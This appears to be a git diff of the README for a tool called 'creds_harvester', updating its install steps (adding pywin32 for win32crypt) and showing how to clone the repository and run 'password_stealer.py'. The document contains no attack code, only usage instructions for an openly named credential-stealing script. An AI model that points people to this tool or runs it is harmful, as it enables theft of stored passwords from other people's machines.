@@ -47,7 +47,6 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 
 ## Prerequisite
 - [x] Python 3.X
-- [x] Few External Modules
 
 ## How To Use 
 ```bash
@@ -61,7 +60,10 @@ $ git clone https://github.com/Technowlogy-Pushpender/creds_harvester.git
 $ cd creds_harvester
 
 # Installing dependencies
-$ python -m pip install -r requirements.txt
+# If You Encounter an Error of win32crypt, then run this command 
+$ python -m pip install --upgrade pywin32  
+# OR
+$ python -m pip install pywin32  
 
 # Run The Script to Get the Result
 $ python password_stealer.py
